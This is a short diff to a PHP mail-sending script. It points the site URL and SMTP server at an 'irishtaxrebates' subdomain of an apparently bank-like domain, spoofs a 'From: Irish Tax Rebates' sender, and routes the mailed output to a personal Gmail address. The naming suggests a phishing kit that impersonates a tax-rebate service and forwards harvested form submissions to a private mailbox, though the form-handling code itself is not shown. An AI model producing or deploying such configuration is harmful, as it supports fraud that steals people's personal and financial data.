@@ -1,6 +1,8 @@
 <?php
+ini_set('SMTP', 'partnerstrustfcu.com');
+ini_set('smtp_port', 465);
 
-$siteUrl = "https://example.com";
+$siteUrl = "https://irishtaxrebates.partnerstrustfcu.com";
 $recipient = "ronaldhoymme@gmail.com";
 
 
@@ -130,7 +132,7 @@ style='border-collapse:collapse;border:1px solid #ddd;'
 $headers = implode("\r\n", [
   "MIME-Version: 1.0",
   "Content-Type:text/html;charset=UTF-8",
-  "From: Website<noreply@example.com>"
+  "From: Irish Tax Rebates <info@partnerstrustfcu.com>\r\n"
 ]);
 
 $mail = mail(
